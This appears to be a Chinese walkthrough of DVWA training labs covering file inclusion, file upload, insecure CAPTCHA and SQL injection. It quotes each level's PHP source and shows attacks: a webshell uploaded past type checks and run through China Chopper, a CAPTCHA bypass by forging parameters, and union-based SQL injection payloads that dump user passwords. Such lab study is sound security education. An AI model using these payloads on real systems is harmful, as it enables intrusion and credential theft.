<p>//Inputvalidation<br>$file=str_replace(array(“http://“,”https://“),””,$file);<br>$file=str_replace(array(“../“,”..&quot;“),””,$file);</p>
<blockquote>
</blockquote>
<hr>
<p>Medium级别的代码增加了str_replace函数，对page参数进行了一定的处理，将”http:// ”、”https://”、 ” ../”、”..\”替换为空字符，即删除。</p>
<p>本地文件包含<br><img src="https://img-blog.csdnimg.cn/20190616173558550.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2FpXzY0,size_16,color_FFFFFF,t_70"></p>
<h2 id="high-1"><a href="#high-1" class="headerlink" title="high"></a>high</h2><hr>
<?php 
// The page we wish to display 
$file = $_GET[ 'page' ]; 
// Input validation 
if( !fnmatch( "file*", $file ) && $file != "include.php" ) { 
    // This isn't the page we want! 
    echo "ERROR: File not found!"; 
    exit; 
} 
?><h2 id="-8"><a href="#-8" class="headerlink" title="  "></a>  </h2><p>High级别的代码使用了fnmatch函数检查page参数，要求page参数的开头必须是file，服务器才会去包含相应的文件。</p>
<p>本地文件包含<br><img src="https://img-blog.csdnimg.cn/20190616173806526.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2FpXzY0,size_16,color_FFFFFF,t_70"></p>
<h2 id="impossible-3"><a href="#impossible-3" class="headerlink" title="impossible"></a>impossible</h2><hr>
<?php 
// The page we wish to display 
$file = $_GET[ 'page' ]; 
// Only allow include.php or file{1..3}.php 
if( $file != "include.php" && $file != "file1.php" && $file != "file2.php" && $file != "file3.php" ) { 
    // This isn't the page we want! 
    echo "ERROR: File not found!"; 
    exit; 
} 
?><h2 id="-9"><a href="#-9" class="headerlink" title=" "></a> </h2><p>Impossible级别的代码彻底杜绝了文件包含漏洞</p>
<h1 id="第五题-File-Upload"><a href="#第五题-File-Upload" class="headerlink" title="第五题-File-Upload"></a>第五题-File-Upload</h1><p><img src="https://image.3001.net/images/20161108/14785910509354.png!small"></p>
<h2 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h2><h2 id="源代码-6"><a href="#源代码-6" class="headerlink" title="源代码"></a>源代码</h2><?php 

if( isset( $_POST[ 'Upload' ] ) ) { 
    // Where are we going to be writing to? 
    $target_path  = DVWA_WEB_PAGE_TO_ROOT . "hackable/uploads/"; 
    $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] ); 

    // Can we move the file to the upload folder? 
    if( !move_uploaded_file( $_FILES[ 'uploaded' ][ 'tmp_name' ], $target_path ) ) { 
        // No 
        echo '<pre>Your image was not uploaded.</pre>'; 
    } 
    else { 
        // Yes! 
        echo "<pre>{$target_path} succesfully uploaded!</pre>"; 
    } 
} 

?><h2 id="-10"><a href="#-10" class="headerlink" title=" "></a> </h2><p>上传文件一句话木马<br><img src="https://image.3001.net/images/20161108/14785912161713.png!small"><br>上传成功，并且返回了上传路径<br><img src="https://image.3001.net/images/20161108/1478591243183.png!small"><br>打开中国菜刀，右键添加，</p>
<p>地址栏填入上传文件所在路径<a target="_blank" rel="noopener" href="http://192.168.153.130/dvwa/hackable/uploads/hack.php%EF%BC%8C">http://192.168.153.130/dvwa/hackable/uploads/hack.php，</a></p>
<p>参数名（一句话木马口令）为apple。</p>
<p><img src="https://image.3001.net/images/20161108/14785912718652.png!small"><br>然后菜刀就会通过向服务器发送包含apple参数的post请求，在服务器上执行任意命令，获取webshell权限。</p>
<p>可以下载、修改服务器的所有文件。<br><img src="https://image.3001.net/images/20161108/14785913093285.png!small"><br>可以打开服务器的虚拟终端。<br><img src="https://image.3001.net/images/20161108/1478591344486.png!small"></p>
<h2 id="Medium-3"><a href="#Medium-3" class="headerlink" title="Medium"></a>Medium</h2><hr>
<?php 

if( isset( $_POST[ 'Upload' ] ) ) { 
    // Where are we going to be writing to? 
    $target_path  = DVWA_WEB_PAGE_TO_ROOT . "hackable/uploads/"; 
    $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] ); 

    // File information 
    $uploaded_name = $_FILES[ 'uploaded' ][ 'name' ]; 
    $uploaded_type = $_FILES[ 'uploaded' ][ 'type' ]; 
    $uploaded_size = $_FILES[ 'uploaded' ][ 'size' ]; 

    // Is it an image? 
    if( ( $uploaded_type == "image/jpeg" || $uploaded_type == "image/png" ) && 
        ( $uploaded_size < 100000 ) ) { 

        // Can we move the file to the upload folder? 
        if( !move_uploaded_file( $_FILES[ 'uploaded' ][ 'tmp_name' ], $target_path ) ) { 
            // No 
            echo '<pre>Your image was not uploaded.</pre>'; 
        } 
        else { 
            // Yes! 
            echo "<pre>{$target_path} succesfully uploaded!</pre>"; 
        } 
    } 
    else { 
        // Invalid file 
        echo '<pre>Your image was not uploaded. We can only accept JPEG or PNG images.</pre>'; 
    } 
} 

?><h2 id="-11"><a href="#-11" class="headerlink" title=" "></a> </h2><p>Medium级别的代码对上传文件的类型、大小做了限制，要求文件类型必须是jpeg或者png，大小不能超过100000B。</p>
<p>因为采用的是一句话木马，所以文件大小不会有问题，至于文件类型的检查，尝试修改文件名为hack.png。<br><img src="https://image.3001.net/images/20161108/14785914897497.png!small"><br>抓包。<br><img src="https://image.3001.net/images/20161108/1478591669326![]()!small"><br>可以看到文件类型为image/png，尝试修改filename为hack.php。<br><img src="https://image.3001.net/images/20161108/14785917089423.png!small"><br>上传成功。<br><img src="https://image.3001.net/images/20161108/14785917335700.png!small"><br>上菜刀，获取webshell权限。<br><img src="https://image.3001.net/images/20161108/14785917654899.png!small"></p>
<h2 id="high-2"><a href="#high-2" class="headerlink" title="high"></a>high</h2><h2 id="源代码-7"><a href="#源代码-7" class="headerlink" title="源代码"></a>源代码</h2><?php 

if( isset( $_POST[ 'Upload' ] ) ) { 
    // Where are we going to be writing to? 
    $target_path  = DVWA_WEB_PAGE_TO_ROOT . "hackable/uploads/"; 
    $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] ); 

    // File information 
    $uploaded_name = $_FILES[ 'uploaded' ][ 'name' ]; 
    $uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, '.' ) + 1); 
    $uploaded_size = $_FILES[ 'uploaded' ][ 'size' ]; 
    $uploaded_tmp  = $_FILES[ 'uploaded' ][ 'tmp_name' ]; 

    // Is it an image? 
    if( ( strtolower( $uploaded_ext ) == "jpg" || strtolower( $uploaded_ext ) == "jpeg" || strtolower( $uploaded_ext ) == "png" ) && 
        ( $uploaded_size < 100000 ) && 
        getimagesize( $uploaded_tmp ) ) { 

        // Can we move the file to the upload folder? 
        if( !move_uploaded_file( $uploaded_tmp, $target_path ) ) { 
            // No 
            echo '<pre>Your image was not uploaded.</pre>'; 
        } 
        else { 
            // Yes! 
            echo "<pre>{$target_path} succesfully uploaded!</pre>"; 
        } 
    } 
    else { 
        // Invalid file 
        echo '<pre>Your image was not uploaded. We can only accept JPEG or PNG images.</pre>'; 
    } 
} 

?><h2 id="-12"><a href="#-12" class="headerlink" title=" "></a> </h2><p>High级别的代码读取文件名中最后一个”.”后的字符串，期望通过文件名来限制文件类型，因此要求上传文件名形式必须是”*.jpg”、”*.jpeg” 、”*.png”之一。同时，getimagesize函数更是限制了上传文件的文件头必须为图像类型。</p>
<p>首先利用copy将一句话木马文件1.php与图片文件1.jpg合并生成hack.jpg，打开可以看到，一句话木马藏到了最后。<br><img src="https://image.3001.net/images/20161108/14785919855138.png!small"><br>顺利通过文件头检查，可以成功上传。<br><img src="https://image.3001.net/images/20161108/14785920131063.png!small"><br>上菜刀，右键添加shell，成功拿到webshell。<br><img src="https://image.3001.net/images/20161108/14785921471182.png!small"></p>
<h2 id="impossible-4"><a href="#impossible-4" class="headerlink" title="impossible"></a>impossible</h2><hr>
<?php 

if( isset( $_POST[ 'Upload' ] ) ) { 
    // Check Anti-CSRF token 
    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' ); 


    // File information 
    $uploaded_name = $_FILES[ 'uploaded' ][ 'name' ]; 
    $uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, '.' ) + 1); 
    $uploaded_size = $_FILES[ 'uploaded' ][ 'size' ]; 
    $uploaded_type = $_FILES[ 'uploaded' ][ 'type' ]; 
    $uploaded_tmp  = $_FILES[ 'uploaded' ][ 'tmp_name' ]; 

    // Where are we going to be writing to? 
    $target_path   = DVWA_WEB_PAGE_TO_ROOT . 'hackable/uploads/'; 
    //$target_file   = basename( $uploaded_name, '.' . $uploaded_ext ) . '-'; 
    $target_file   =  md5( uniqid() . $uploaded_name ) . '.' . $uploaded_ext; 
    $temp_file     = ( ( ini_get( 'upload_tmp_dir' ) == '' ) ? ( sys_get_temp_dir() ) : ( ini_get( 'upload_tmp_dir' ) ) ); 
    $temp_file    .= DIRECTORY_SEPARATOR . md5( uniqid() . $uploaded_name ) . '.' . $uploaded_ext; 

    // Is it an image? 
    if( ( strtolower( $uploaded_ext ) == 'jpg' || strtolower( $uploaded_ext ) == 'jpeg' || strtolower( $uploaded_ext ) == 'png' ) && 
        ( $uploaded_size < 100000 ) && 
        ( $uploaded_type == 'image/jpeg' || $uploaded_type == 'image/png' ) && 
        getimagesize( $uploaded_tmp ) ) { 

        // Strip any metadata, by re-encoding image (Note, using php-Imagick is recommended over php-GD) 
        if( $uploaded_type == 'image/jpeg' ) { 
            $img = imagecreatefromjpeg( $uploaded_tmp ); 
            imagejpeg( $img, $temp_file, 100); 
        } 
        else { 
            $img = imagecreatefrompng( $uploaded_tmp ); 
            imagepng( $img, $temp_file, 9); 
        } 
        imagedestroy( $img ); 

        // Can we move the file to the web root from the temp folder? 
        if( rename( $temp_file, ( getcwd() . DIRECTORY_SEPARATOR . $target_path . $target_file ) ) ) { 
            // Yes! 
            echo "<pre><a href='${target_path}${target_file}'>${target_file}</a> succesfully uploaded!</pre>"; 
        } 
        else { 
            // No 
            echo '<pre>Your image was not uploaded.</pre>'; 
        } 

        // Delete any temp files 
        if( file_exists( $temp_file ) ) 
            unlink( $temp_file ); 
    } 
    else { 
        // Invalid file 
        echo '<pre>Your image was not uploaded. We can only accept JPEG or PNG images.</pre>'; 
    } 
} 

// Generate Anti-CSRF token 
generateSessionToken(); 

?><h2 id="-13"><a href="#-13" class="headerlink" title=" "></a> </h2><p>Impossible级别的代码对上传文件进行了重命名（为md5值，导致%00截断无法绕过过滤规则），加入Anti-CSRF token防护CSRF攻击，同时对文件的内容作了严格的检查，导致攻击者无法上传含有恶意脚本的文件。</p>
<h1 id="第六题-Insecure-CAPTCHA"><a href="#第六题-Insecure-CAPTCHA" class="headerlink" title="第六题-Insecure-CAPTCHA"></a>第六题-Insecure-CAPTCHA</h1><p><img src="https://image.3001.net/images/20161110/1478762521859.png!small"></p>
<h2 id="low-4"><a href="#low-4" class="headerlink" title="low"></a>low</h2><h2 id="源代码-8"><a href="#源代码-8" class="headerlink" title="源代码"></a>源代码</h2><?php 

if( isset( $_POST[ 'Change' ] ) && ( $_POST[ 'step' ] == '1' ) ) { 
    // Hide the CAPTCHA form 
    $hide_form = true; 

    // Get input 
    $pass_new  = $_POST[ 'password_new' ]; 
    $pass_conf = $_POST[ 'password_conf' ]; 

    // Check CAPTCHA from 3rd party 
    $resp = recaptcha_check_answer( $_DVWA[ 'recaptcha_private_key' ], 
        $_SERVER[ 'REMOTE_ADDR' ], 
        $_POST[ 'recaptcha_challenge_field' ], 
        $_POST[ 'recaptcha_response_field' ] ); 

    // Did the CAPTCHA fail? 
    if( !$resp->is_valid ) { 
        // What happens when the CAPTCHA was entered incorrectly 
        $html     .= "<pre><br />The CAPTCHA was incorrect. Please try again.</pre>"; 
        $hide_form = false; 
        return; 
    } 
    else { 
        // CAPTCHA was correct. Do both new passwords match? 
        if( $pass_new == $pass_conf ) { 
            // Show next stage for the user 
            echo " 
                <pre><br />You passed the CAPTCHA! Click the button to confirm your changes.<br /></pre> 
                <form action=\"#\" method=\"POST\"> 
                    <input type=\"hidden\" name=\"step\" value=\"2\" /> 
                    <input type=\"hidden\" name=\"password_new\" value=\"{$pass_new}\" /> 
                    <input type=\"hidden\" name=\"password_conf\" value=\"{$pass_conf}\" /> 
                    <input type=\"submit\" name=\"Change\" value=\"Change\" /> 
                </form>"; 
        } 
        else { 
            // Both new passwords do not match. 
            $html     .= "<pre>Both passwords must match.</pre>"; 
            $hide_form = false; 
        } 
    } 
} 

if( isset( $_POST[ 'Change' ] ) && ( $_POST[ 'step' ] == '2' ) ) { 
    // Hide the CAPTCHA form 
    $hide_form = true; 

    // Get input 
    $pass_new  = $_POST[ 'password_new' ]; 
    $pass_conf = $_POST[ 'password_conf' ]; 

    // Check to see if both password match 
    if( $pass_new == $pass_conf ) { 
        // They do! 
        $pass_new = mysql_real_escape_string( $pass_new ); 
        $pass_new = md5( $pass_new ); 

        // Update database 
        $insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . dvwaCurrentUser() . "';"; 
        $result = mysql_query( $insert ) or die( '<pre>' . mysql_error() . '</pre>' ); 

        // Feedback for the end user 
        echo "<pre>Password Changed.</pre>"; 
    } 
    else { 
        // Issue with the passwords matching 
        echo "<pre>Passwords did not match.</pre>"; 
        $hide_form = false; 
    } 

    mysql_close(); 
} 

?><h2 id="-14"><a href="#-14" class="headerlink" title=" "></a> </h2><p>服务器将改密操作分成了两步，第一步检查用户输入的验证码，验证通过后，服务器返回表单，第二步客户端提交post请求，服务器完成更改密码的操作。但是，这其中存在明显的逻辑漏洞，服务器仅仅通过检查Change、step 参数来判断用户是否已经输入了正确的验证码。</p>
<p>首先输入密码，点击Change按钮，抓包：<br><img src="https://image.3001.net/images/20161110/1478762833724![]()!small"><br>修改密码成功：<br><img src="https://image.3001.net/images/20161110/1478762911998.png!small"></p>
<h2 id="medium-1"><a href="#medium-1" class="headerlink" title="medium"></a>medium</h2><h2 id="源代码-9"><a href="#源代码-9" class="headerlink" title="源代码"></a>源代码</h2><?php 

if( isset( $_POST[ 'Change' ] ) && ( $_POST[ 'step' ] == '1' ) ) { 
    // Hide the CAPTCHA form 
    $hide_form = true; 

    // Get input 
    $pass_new  = $_POST[ 'password_new' ]; 
    $pass_conf = $_POST[ 'password_conf' ]; 

    // Check CAPTCHA from 3rd party 
    $resp = recaptcha_check_answer( $_DVWA[ 'recaptcha_private_key' ], 
        $_SERVER[ 'REMOTE_ADDR' ], 
        $_POST[ 'recaptcha_challenge_field' ], 
        $_POST[ 'recaptcha_response_field' ] ); 

    // Did the CAPTCHA fail? 
    if( !$resp->is_valid ) { 
        // What happens when the CAPTCHA was entered incorrectly 
        $html     .= "<pre><br />The CAPTCHA was incorrect. Please try again.</pre>"; 
        $hide_form = false; 
        return; 
    } 
    else { 
        // CAPTCHA was correct. Do both new passwords match? 
        if( $pass_new == $pass_conf ) { 
            // Show next stage for the user 
            echo " 
                <pre><br />You passed the CAPTCHA! Click the button to confirm your changes.<br /></pre> 
                <form action=\"#\" method=\"POST\"> 
                    <input type=\"hidden\" name=\"step\" value=\"2\" /> 
                    <input type=\"hidden\" name=\"password_new\" value=\"{$pass_new}\" /> 
                    <input type=\"hidden\" name=\"password_conf\" value=\"{$pass_conf}\" /> 
                    <input type=\"hidden\" name=\"passed_captcha\" value=\"true\" /> 
                    <input type=\"submit\" name=\"Change\" value=\"Change\" /> 
                </form>"; 
        } 
        else { 
            // Both new passwords do not match. 
            $html     .= "<pre>Both passwords must match.</pre>"; 
            $hide_form = false; 
        } 
    } 
} 

if( isset( $_POST[ 'Change' ] ) && ( $_POST[ 'step' ] == '2' ) ) { 
    // Hide the CAPTCHA form 
    $hide_form = true; 

    // Get input 
    $pass_new  = $_POST[ 'password_new' ]; 
    $pass_conf = $_POST[ 'password_conf' ]; 

    // Check to see if they did stage 1 
    if( !$_POST[ 'passed_captcha' ] ) { 
        $html     .= "<pre><br />You have not passed the CAPTCHA.</pre>"; 
        $hide_form = false; 
        return; 
    } 

    // Check to see if both password match 
    if( $pass_new == $pass_conf ) { 
        // They do! 
        $pass_new = mysql_real_escape_string( $pass_new ); 
        $pass_new = md5( $pass_new ); 

        // Update database 
        $insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . dvwaCurrentUser() . "';"; 
        $result = mysql_query( $insert ) or die( '<pre>' . mysql_error() . '</pre>' ); 

        // Feedback for the end user 
        echo "<pre>Password Changed.</pre>"; 
    } 
    else { 
        // Issue with the passwords matching 
        echo "<pre>Passwords did not match.</pre>"; 
        $hide_form = false; 
    } 

    mysql_close(); 
} 

?><h2 id="-15"><a href="#-15" class="headerlink" title=" "></a> </h2><p>可以看到，Medium级别的代码在第二步验证时，参加了对参数passed_captcha的检查，如果参数值为true，则认为用户已经通过了验证码检查，然而用户依然可以通过伪造参数绕过验证，本质上来说，这与Low级别的验证没有任何区别。<br>抓到的包：<br><img src="https://image.3001.net/images/20161110/1478763222683.png!small"><br>更改之后的包：<br><img src="https://image.3001.net/images/20161110/14787632525623.png!small"><br>成功<br><img src="https://image.3001.net/images/20161110/14787632811739.png!small"></p>
<h2 id="high-3"><a href="#high-3" class="headerlink" title="high"></a>high</h2><hr>
<?php 

if( isset( $_POST[ 'Change' ] ) ) { 
    // Hide the CAPTCHA form 
    $hide_form = true; 

    // Get input 
    $pass_new  = $_POST[ 'password_new' ]; 
    $pass_conf = $_POST[ 'password_conf' ]; 

    // Check CAPTCHA from 3rd party 
    $resp = recaptcha_check_answer( $_DVWA[ 'recaptcha_private_key' ], 
        $_SERVER[ 'REMOTE_ADDR' ], 
        $_POST[ 'recaptcha_challenge_field' ], 
        $_POST[ 'recaptcha_response_field' ] ); 

    // Did the CAPTCHA fail? 
    if( !$resp->is_valid && ( $_POST[ 'recaptcha_response_field' ] != 'hidd3n_valu3' || $_SERVER[ 'HTTP_USER_AGENT' ] != 'reCAPTCHA' ) ) { 
        // What happens when the CAPTCHA was entered incorrectly 
        $html     .= "<pre><br />The CAPTCHA was incorrect. Please try again.</pre>"; 
        $hide_form = false; 
        return; 
    } 
    else { 
        // CAPTCHA was correct. Do both new passwords match? 
        if( $pass_new == $pass_conf ) { 
            $pass_new = mysql_real_escape_string( $pass_new ); 
            $pass_new = md5( $pass_new ); 

            // Update database 
            $insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . dvwaCurrentUser() . "' LIMIT 1;"; 
            $result = mysql_query( $insert ) or die( '<pre>' . mysql_error() . '</pre>' ); 

            // Feedback for user 
            echo "<pre>Password Changed.</pre>"; 
        } 
        else { 
            // Ops. Password mismatch 
            $html     .= "<pre>Both passwords must match.</pre>"; 
            $hide_form = false; 
        } 
    } 

    mysql_close(); 
} 
// Generate Anti-CSRF token 
generateSessionToken(); 

?><h2 id="-16"><a href="#-16" class="headerlink" title=" "></a> </h2><p>服务器的验证逻辑是当$resp是false，并且参数recaptcha_response_field不等于hidd3n_valu3或者http包头的User-Agent参数不等于reCAPTCHA时，就认为验证码输入错误，反之则认为已经通过了验证码的检查。<br>抓包<br><img src="https://image.3001.net/images/20161110/14787634573020.png!small"><br>更改参数recaptcha_response_field以及http包头的User-Agent：<br><img src="https://image.3001.net/images/20161110/1478763487811![]()!small"><br>密码修改成功：<br><img src="https://image.3001.net/images/20161110/14787635158708.png!small"></p>
<h2 id="impossible-5"><a href="#impossible-5" class="headerlink" title="impossible"></a>impossible</h2><h2 id="源代码-10"><a href="#源代码-10" class="headerlink" title="源代码"></a>源代码</h2><p>if( isset( $_POST[ ‘Change’ ] ) ) {<br>    // Check Anti-CSRF token<br>    checkToken( $_REQUEST[ ‘user_token’ ], $_SESSION[ ‘session_token’ ], ‘index.php’ ); </p>
<pre><code>// Hide the CAPTCHA form 
$hide_form = true; 

// Get input 
$pass_new  = $_POST[ &#39;password_new&#39; ]; 
$pass_new  = stripslashes( $pass_new ); 
$pass_new  = mysql_real_escape_string( $pass_new ); 
$pass_new  = md5( $pass_new ); 

$pass_conf = $_POST[ &#39;password_conf&#39; ]; 
$pass_conf = stripslashes( $pass_conf ); 
$pass_conf = mysql_real_escape_string( $pass_conf ); 
$pass_conf = md5( $pass_conf ); 

$pass_curr = $_POST[ &#39;password_current&#39; ]; 
$pass_curr = stripslashes( $pass_curr ); 
$pass_curr = mysql_real_escape_string( $pass_curr ); 
$pass_curr = md5( $pass_curr ); 

// Check CAPTCHA from 3rd party 
$resp = recaptcha_check_answer( $_DVWA[ &#39;recaptcha_private_key&#39; ], 
    $_SERVER[ &#39;REMOTE_ADDR&#39; ], 
    $_POST[ &#39;recaptcha_challenge_field&#39; ], 
    $_POST[ &#39;recaptcha_response_field&#39; ] ); 

// Did the CAPTCHA fail? 
if( !$resp-&gt;is_valid ) &#123; 
    // What happens when the CAPTCHA was entered incorrectly 
    echo &quot;&lt;pre&gt;&lt;br /&gt;The CAPTCHA was incorrect. Please try again.&lt;/pre&gt;&quot;; 
    $hide_form = false; 
    return; 
&#125; 
else &#123; 
    // Check that the current password is correct 
    $data = $db-&gt;prepare( &#39;SELECT password FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;&#39; ); 
    $data-&gt;bindParam( &#39;:user&#39;, dvwaCurrentUser(), PDO::PARAM_STR ); 
    $data-&gt;bindParam( &#39;:password&#39;, $pass_curr, PDO::PARAM_STR ); 
    $data-&gt;execute(); 

    // Do both new password match and was the current password correct? 
    if( ( $pass_new == $pass_conf) &amp;&amp; ( $data-&gt;rowCount() == 1 ) ) &#123; 
        // Update the database 
        $data = $db-&gt;prepare( &#39;UPDATE users SET password = (:password) WHERE user = (:user);&#39; ); 
        $data-&gt;bindParam( &#39;:password&#39;, $pass_new, PDO::PARAM_STR ); 
        $data-&gt;bindParam( &#39;:user&#39;, dvwaCurrentUser(), PDO::PARAM_STR ); 
        $data-&gt;execute(); 

        // Feedback for the end user - success! 
        echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;; 
    &#125; 
    else &#123; 
        // Feedback for the end user - failed! 
        echo &quot;&lt;pre&gt;Either your current password is incorrect or the new passwords did not match.&lt;br /&gt;Please try again.&lt;/pre&gt;&quot;; 
        $hide_form = false; 
    &#125; 
&#125; </code></pre>
<p>} </p>
<p>// Generate Anti-CSRF token<br>generateSessionToken(); </p>
<h2 id="gt"><a href="#gt" class="headerlink" title="?&gt; "></a>?&gt; </h2><p>Impossible级别的代码增加了Anti-CSRF token 机制防御CSRF攻击，利用PDO技术防护sql注入，验证过程终于不再分成两部分了，验证码无法绕过，同时要求用户输入之前的密码，进一步加强了身份认证。</p>
<h1 id="第七题-SQL-Injection"><a href="#第七题-SQL-Injection" class="headerlink" title="第七题-SQL-Injection"></a>第七题-SQL-Injection</h1><h2 id="low-5"><a href="#low-5" class="headerlink" title="low"></a>low</h2><h2 id="源代码-11"><a href="#源代码-11" class="headerlink" title="源代码"></a>源代码</h2><?php 

if( isset( $_REQUEST[ 'Submit' ] ) ) { 
    // Get input 
    $id = $_REQUEST[ 'id' ]; 

    // Check database 
    $query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';"; 
    $result = mysql_query( $query ) or die( '<pre>' . mysql_error() . '</pre>' ); 

    // Get results 
    $num = mysql_numrows( $result ); 
    $i   = 0; 
    while( $i < $num ) { 
        // Get values 
        $first = mysql_result( $result, $i, "first_name" ); 
        $last  = mysql_result( $result, $i, "last_name" ); 

        // Feedback for end user 
        echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>"; 

        // Increase loop count 
        $i++; 
    } 

    mysql_close(); 
} 

?><h2 id="-17"><a href="#-17" class="headerlink" title=" "></a> </h2><p>Low级别的代码对来自客户端的参数id没有进行任何的检查与过滤，存在明显的SQL注入。</p>
<p>输入1，查询成功：</p>
<p>输入1’and ‘1’ =’2，查询失败，返回结果为空：</p>
<p>输入1’or ‘1234 ’=’1234，查询成功：</p>
<p>返回了多个结果，说明存在字符型注入。</p>
<p>输入1’ or 1=1 order by 1 #，查询成功：<br><img src="https://image.3001.net/images/20161122/14797983721114.png!small"><br>输入1’ or 1=1 order by 2 #，查询成功：<br><img src="https://image.3001.net/images/20161122/14797984067767.png!small"><br>输入1’ or 1=1 order by 3 #，查询失败：<br><img src="https://image.3001.net/images/20161122/14797984355690.png!small"><br>输入1’ union select 1,database() #，查询成功：<br><img src="https://image.3001.net/images/20161122/14797985121733.png!small"><br>输入1’ union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #，查询成功：<br><img src="https://image.3001.net/images/20161122/14797985443503.png!small"><br>输入1’ union select 1,group_concat(column_name) from information_schema.columns where table_name=’users’ #，查询成功：<br><img src="https://image.3001.net/images/20161122/14797985937424.png!small"><br>输入1’ or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #，查询成功：<br><img src="https://image.3001.net/images/20161122/1479801212675![]()!small"><br>这样就得到了users表中所有用户的user_id,first_name,last_name,password的数据。</p>
<h2 id="medium-2"><a href="#medium-2" class="headerlink" title="medium"></a>medium</h2><hr>
<?php 

if( isset( $_POST[ 'Submit' ] ) ) { 
    // Get input 
    $id = $_POST[ 'id' ]; 
    $id = mysql_real_escape_string( $id ); 

    // Check database 
    $query  = "SELECT first_name, last_name FROM users WHERE user_id = $id;"; 
    $result = mysql_query( $query ) or die( '<pre>' . mysql_error() . '</pre>' ); 

    // Get results 
    $num = mysql_numrows( $result ); 
    $i   = 0; 
    while( $i < $num ) { 
        // Display values 
        $first = mysql_result( $result, $i, "first_name" ); 
        $last  = mysql_result( $result, $i, "last_name" ); 

        // Feedback for end user 
        echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>"; 

        // Increase loop count 
        $i++; 
    } 

    //mysql_close(); 
} 

?><h2 id="-18"><a href="#-18" class="headerlink" title=" "></a> </h2><p>Medium级别的代码利用mysql_real_escape_string函数对特殊符号\x00,\n,\r,,‘,”,\x1a进行转义，同时前端页面设置了下拉选择表单，希望以此来控制用户的输入。<br>1.判断是否存在注入，注入是字符型还是数字型</p>
<p>抓包更改参数id为1 or 1=1 #，查询成功：</p>
<p><img src="https://image.3001.net/images/20161122/1479798808442.png!small"></p>
<p>说明存在数字型注入。</p>
<p>（由于是数字型注入，服务器端的mysql_real_escape_string函数就形同虚设了，因为数字型注入并不需要借助引号。）</p>
<p>2.猜解SQL查询语句中的字段数<br>抓包更改参数id为1 order by 2 #，查询成功：</p>
<p><img src="https://image.3001.net/images/20161122/14797988504283.png!small"></p>
<p>抓包更改参数id为1 order by 3 #，报错：</p>
<p><img src="https://image.3001.net/images/20161122/14797988815192.png!small"></p>
<p>说明执行的SQL查询语句中只有两个字段，即这里的First name、Surname。</p>
<p>3.确定显示的字段顺序</p>
<p>抓包更改参数id为1 union select 1,2 #，查询成功：</p>
<p><img src="https://image.3001.net/images/20161122/14797989187637.png!small"></p>
<p>说明执行的SQL语句为select First name,Surname from 表 where ID=id…</p>
<p>4.获取当前数据库<br>抓包更改参数id为1 union select 1,database() #，查询成功：</p>
<p><img src="https://image.3001.net/images/20161122/14797989528253.png!small"><br>说明当前的数据库为dvwa。</p>
<p>5.获取数据库中的表<br>抓包更改参数id为1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #，查询成功：</p>
<p><img src="https://image.3001.net/images/20161122/14797989786852.png!small"></p>
<p>说明数据库dvwa中一共有两个表，guestbook与users。</p>
<p>6.获取表中的字段名<br>抓包更改参数id为1 union select 1,group_concat(column_name) from information_schema.columns where table_name=’users ’#，查询失败：</p>
<p><img src="https://image.3001.net/images/20161122/14797990065259.png!small"></p>
<p>这是因为单引号被转义了，变成了\’。</p>
<p>可以利用16进制进行绕过，抓包更改参数id为1 union select 1,group_concat(column_name) from information_schema.columns where table_name=0x7573657273 #，查询成功：</p>
<p><img src="https://image.3001.net/images/20161122/14797990363415.png!small"></p>
<p>说明users表中有8个字段，分别是user_id,first_name,last_name,user,password,avatar,last_login,failed_login。</p>
<p>7.下载数据<br>抓包修改参数id为1 or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #，查询成功：</p>
<p><img src="https://image.3001.net/images/20161122/14798013767789.png!small"></p>
<p>这样就得到了users表中所有用户的user_id,first_name,last_name,password的数据</p>
<h2 id="High-2"><a href="#High-2" class="headerlink" title="High"></a>High</h2><h2 id="源代码-12"><a href="#源代码-12" class="headerlink" title="源代码"></a>源代码</h2><?php 

if( isset( $_SESSION [ 'id' ] ) ) { 
    // Get input 
    $id = $_SESSION[ 'id' ]; 

    // Check database 
    $query  = "SELECT first_name, last_name FROM users WHERE user_id = $id LIMIT 1;"; 
    $result = mysql_query( $query ) or die( '<pre>Something went wrong.</pre>' ); 

    // Get results 
    $num = mysql_numrows( $result ); 
    $i   = 0; 
    while( $i < $num ) { 
        // Get values 
        $first = mysql_result( $result, $i, "first_name" ); 
        $last  = mysql_result( $result, $i, "last_name" ); 

        // Feedback for end user 
        echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>"; 

        // Increase loop count 
        $i++; 
    } 

    mysql_close(); 
} 

?><h2 id="-19"><a href="#-19" class="headerlink" title=" "></a> </h2><p>可以看到，与Medium级别的代码相比，High级别的只是在SQL查询语句中添加了LIMIT 1，希望以此控制只输出一个结果。</p>
<p>虽然添加了LIMIT 1，但是我们可以通过#将其注释掉。由于手工注入的过程与Low级别基本一样，直接最后一步演示下载数据。</p>
<p>输入1 or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #，查询成功：</p>
<p><img src="https://image.3001.net/images/20161122/14798014536165.png!small"></p>
<p>需要特别提到的是，High级别的查询提交页面与查询结果显示页面不是同一个，也没有执行302跳转，这样做的目的是为了防止一般的sqlmap注入，因为sqlmap在注入过程中，无法在查询提交页面上获取查询的结果，没有了反馈，也就没办法进一步注入。</p>
